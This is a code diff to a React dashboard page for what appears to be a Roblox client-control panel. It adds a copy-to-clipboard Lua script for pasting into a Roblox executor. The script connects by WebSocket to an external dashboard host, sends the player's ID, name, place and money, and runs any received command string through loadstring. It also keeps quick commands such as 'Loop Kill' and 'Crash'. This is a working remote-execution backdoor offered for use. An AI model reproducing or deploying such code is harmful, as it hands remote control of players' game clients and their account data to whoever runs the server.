@@ -8,6 +8,7 @@ import {
   CardHeader,
   CardTitle,
   CardDescription,
+  CardFooter,
 } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import {
@@ -21,10 +22,13 @@ import {
   Trash2,
   Flame,
   Shield,
+  Code,
+  Copy,
 } from "lucide-react";
 import CommandSender from "@/components/CommandSender";
 import ClientsList from "@/components/ClientsList";
 import { useClientManager } from "@/hooks/useClientManager";
+import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
 
 const ClientManager = () => {
   const {
@@ -37,6 +41,101 @@ const ClientManager = () => {
     deselectAllClients,
     refreshClients,
   } = useClientManager();
+
+  const copyLuaCode = () => {
+    const luaCode = `
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- Function to establish WebSocket connection
+local function connectToWebSocket()
+    local websocket
+    
+    -- Try to create a WebSocket connection
+    local success, error = pcall(function()
+        websocket = WebSocket.connect("wss://lurkcc-dashboard.lovable.app/ws")
+    end)
+    
+    if not success then
+        warn("Failed to connect to WebSocket: " .. tostring(error))
+        return
+    end
+    
+    -- Handle incoming messages
+    websocket.OnMessage:Connect(function(message)
+        local success, data = pcall(function()
+            return HttpService:JSONDecode(message)
+        end)
+        
+        if success then
+            -- Handle different message types
+            if data.action == "execute_command" then
+                local command = data.data.command
+                print("Received command: " .. command)
+                
+                -- Execute the command
+                pcall(function()
+                    loadstring(command)()
+                end)
+            end
+        else
+            warn("Failed to parse message: " .. message)
+        end
+    end)
+    
+    -- Send initial client data
+    local clientData = {
+        action = "client_connected",
+        data = {
+            userId = player.UserId,
+            username = player.Name,
+            place = game.PlaceId,
+            money = player.leaderstats and player.leaderstats.Money and player.leaderstats.Money.Value or 0,
+            additionalData = {
+                -- Add any additional data you want to send here
+            }
+        }
+    }
+    
+    websocket:Send(HttpService:JSONEncode(clientData))
+    
+    -- Keep sending heartbeat
+    spawn(function()
+        while wait(30) do
+            if websocket.ReadyState == 1 then -- 1 means the connection is open
+                websocket:Send(HttpService:JSONEncode({
+                    action = "heartbeat",
+                    data = {
+                        userId = player.UserId
+                    }
+                }))
+            else
+                break
+            end
+        end
+    end)
+    
+    return websocket
+end
+
+-- Start connection
+local ws = connectToWebSocket()
+
+-- Reconnect if disconnected
+spawn(function()
+    while wait(60) do -- Check every minute
+        if not ws or ws.ReadyState ~= 1 then
+            ws = connectToWebSocket()
+        end
+    end
+end)`;
+
+    navigator.clipboard.writeText(luaCode);
+    toast.success("Lua code copied to clipboard", {
+      description: "Paste this into your Roblox executor or script"
+    });
+  };
 
   return (
     <div className="flex flex-col min-h-screen bg-background">
@@ -53,7 +152,7 @@ const ClientManager = () => {
 
         <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
           {/* Left panel - Client list */}
-          <Card className="lg:col-span-2 glass-morphism border-white/5 overflow-hidden">
+          <Card className="lg:col-span-2 border-white/5 overflow-hidden">
             <CardHeader className="pb-3">
               <div className="flex items-center justify-between">
                 <div>
@@ -104,85 +203,157 @@ const ClientManager = () => {
           </Card>
 
           {/* Right panel - Command center */}
-          <Card className="glass-morphism border-white/5 overflow-hidden">
-            <CardHeader>
-              <CardTitle>Command Center</CardTitle>
-              <CardDescription>
-                {selectedClients.length === 0 
-                  ? "Select clients to send commands" 
-                  : `Send commands to ${selectedClients.length} selected client${selectedClients.length > 1 ? 's' : ''}`}
-              </CardDescription>
-            </CardHeader>
-            <CardContent>
-              <CommandSender 
-                selectedClients={selectedClients}
-                sendCommand={sendCommand}
-                disabled={selectedClients.length === 0}
-              />
-              
-              {selectedClients.length > 0 && (
-                <div className="mt-4 space-y-2">
-                  <p className="text-xs text-muted-foreground mb-2">Quick Commands:</p>
-                  <div className="flex flex-wrap gap-2">
-                    <Button 
-                      variant="outline" 
-                      size="sm" 
-                      onClick={() => sendCommand("loopkill")}
-                      className="text-xs"
-                    >
-                      <Skull className="h-3.5 w-3.5 mr-1.5 text-red-400" />
-                      Loop Kill
-                    </Button>
-                    <Button 
-                      variant="outline" 
-                      size="sm" 
-                      onClick={() => sendCommand("hide")}
-                      className="text-xs"
-                    >
-                      <EyeOff className="h-3.5 w-3.5 mr-1.5 text-blue-400" />
-                      Hide
-                    </Button>
-                    <Button 
-                      variant="outline" 
-                      size="sm" 
-                      onClick={() => sendCommand("unhide")}
-                      className="text-xs"
-                    >
-                      <Eye className="h-3.5 w-3.5 mr-1.5 text-green-400" />
-                      Unhide
-                    </Button>
-                    <Button 
-                      variant="outline" 
-                      size="sm" 
-                      onClick={() => sendCommand("noclip")}
-                      className="text-xs"
-                    >
-                      <Shield className="h-3.5 w-3.5 mr-1.5 text-purple-400" />
-                      Noclip
-                    </Button>
-                    <Button 
-                      variant="outline" 
-                      size="sm" 
-                      onClick={() => sendCommand("crash")}
-                      className="text-xs"
-                    >
-                      <Trash2 className="h-3.5 w-3.5 mr-1.5 text-red-500" />
-                      Crash
-                    </Button>
-                    <Button 
-                      variant="outline" 
-                      size="sm" 
-                      onClick={() => sendCommand("godmode")}
-                      className="text-xs"
-                    >
-                      <Flame className="h-3.5 w-3.5 mr-1.5 text-yellow-400" />
-                      God Mode
-                    </Button>
+          <div className="space-y-6">
+            <Card className="border-white/5 overflow-hidden">
+              <CardHeader>
+                <CardTitle>Command Center</CardTitle>
+                <CardDescription>
+                  {selectedClients.length === 0 
+                    ? "Select clients to send commands" 
+                    : `Send commands to ${selectedClients.length} selected client${selectedClients.length > 1 ? 's' : ''}`}
+                </CardDescription>
+              </CardHeader>
+              <CardContent>
+                <CommandSender 
+                  selectedClients={selectedClients}
+                  sendCommand={sendCommand}
+                  disabled={selectedClients.length === 0}
+                />
+                
+                {selectedClients.length > 0 && (
+                  <div className="mt-4 space-y-2">
+                    <p className="text-xs text-muted-foreground mb-2">Quick Commands:</p>
+                    <div className="flex flex-wrap gap-2">
+                      <Button 
+                        variant="outline" 
+                        size="sm" 
+                        onClick={() => sendCommand("loopkill")}
+                        className="text-xs"
+                      >
+                        <Skull className="h-3.5 w-3.5 mr-1.5 text-red-400" />
+                        Loop Kill
+                      </Button>
+                      <Button 
+                        variant="outline" 
+                        size="sm" 
+                        onClick={() => sendCommand("hide")}
+                        className="text-xs"
+                      >
+                        <EyeOff className="h-3.5 w-3.5 mr-1.5 text-blue-400" />
+                        Hide
+                      </Button>
+                      <Button 
+                        variant="outline" 
+                        size="sm" 
+                        onClick={() => sendCommand("unhide")}
+                        className="text-xs"
+                      >
+                        <Eye className="h-3.5 w-3.5 mr-1.5 text-green-400" />
+                        Unhide
+                      </Button>
+                      <Button 
+                        variant="outline" 
+                        size="sm" 
+                        onClick={() => sendCommand("noclip")}
+                        className="text-xs"
+                      >
+                        <Shield className="h-3.5 w-3.5 mr-1.5 text-purple-400" />
+                        Noclip
+                      </Button>
+                      <Button 
+                        variant="outline" 
+                        size="sm" 
+                        onClick={() => sendCommand("crash")}
+                        className="text-xs"
+                      >
+                        <Trash2 className="h-3.5 w-3.5 mr-1.5 text-red-500" />
+                        Crash
+                      </Button>
+                      <Button 
+                        variant="outline" 
+                        size="sm" 
+                        onClick={() => sendCommand("godmode")}
+                        className="text-xs"
+                      >
+                        <Flame className="h-3.5 w-3.5 mr-1.5 text-yellow-400" />
+                        God Mode
+                      </Button>
+                    </div>
+                  </div>
+                )}
+              </CardContent>
+            </Card>
+            
+            {/* Connection Guide */}
+            <Card className="border-white/5 overflow-hidden">
+              <CardHeader>
+                <CardTitle className="flex items-center">
+                  <Code className="mr-2 h-5 w-5" />
+                  Connection Guide
+                </CardTitle>
+                <CardDescription>
+                  How to connect Roblox clients to this dashboard
+                </CardDescription>
+              </CardHeader>
+              <CardContent>
+                <div className="space-y-4">
+                  <div>
+                    <h3 className="text-sm font-medium mb-1">WebSocket URL</h3>
+                    <div className="flex items-center gap-2">
+                      <code className="bg-muted p-2 rounded text-xs font-mono flex-1">
+                        wss://lurkcc-dashboard.lovable.app/ws
+                      </code>
+                      <TooltipProvider>
+                        <Tooltip>
+                          <TooltipTrigger asChild>
+                            <Button 
+                              variant="outline" 
+                              size="sm" 
+                              className="h-8 w-8 p-0"
+                              onClick={() => {
+                                navigator.clipboard.writeText("wss://lurkcc-dashboard.lovable.app/ws");
+                                toast.success("WebSocket URL copied");
+                              }}
+                            >
+                              <Copy className="h-4 w-4" />
+                            </Button>
+                          </TooltipTrigger>
+                          <TooltipContent>
+                            <p className="text-xs">Copy URL</p>
+                          </TooltipContent>
+                        </Tooltip>
+                      </TooltipProvider>
+                    </div>
+                  </div>
+                  
+                  <div>
+                    <h3 className="text-sm font-medium mb-1">Payload Format</h3>
+                    <pre className="bg-muted p-2 rounded text-xs font-mono overflow-x-auto">
+{`{
+  "action": "client_connected",
+  "data": {
+    "userId": 123,
+    "username": "PlayerName",
+    "place": "GameName",
+    "money": 1000
+  }
+}`}
+                    </pre>
                   </div>
                 </div>
-              )}
-            </CardContent>
-          </Card>
+              </CardContent>
+              <CardFooter className="border-t border-border/10 pt-4">
+                <Button 
+                  onClick={copyLuaCode}
+                  variant="secondary" 
+                  className="w-full text-xs"
+                >
+                  <Code className="mr-2 h-4 w-4" />
+                  Copy Lua Connection Code
+                </Button>
+              </CardFooter>
+            </Card>
+          </div>
         </div>
       </div>
     </div>
